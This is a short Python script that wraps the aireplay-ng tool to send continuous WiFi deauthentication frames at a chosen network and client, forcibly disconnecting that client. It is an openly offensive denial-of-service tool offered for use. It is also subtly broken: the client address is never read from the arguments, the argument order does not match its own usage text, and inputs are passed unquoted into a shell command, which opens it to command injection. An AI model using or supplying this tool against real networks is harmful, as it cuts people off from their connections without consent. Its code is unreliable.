import os
import sys

def main(network_bssid, client_bssid, interface):
    os.system('aireplay-ng -0 0 -a ' + network_bssid + ' -c ' + client_bssid + ' ' + interface)

if __name__ == '__main__': 
    if len(sys.argv) <= 2:
        print('ARGUMENT ERROR:\nUsage: sudo python3 deauth_client.py -n -c -i\n-n bssid (mac adress) of WiFi network\n-c bssid (mac adress) of client to deauthenticate\n-i interface set to monitor mode')
        exit(1)
    
    network_bssid = sys.argv[1]
    interface = sys.argv[2]
    main(network_bssid, client_bssid, interface)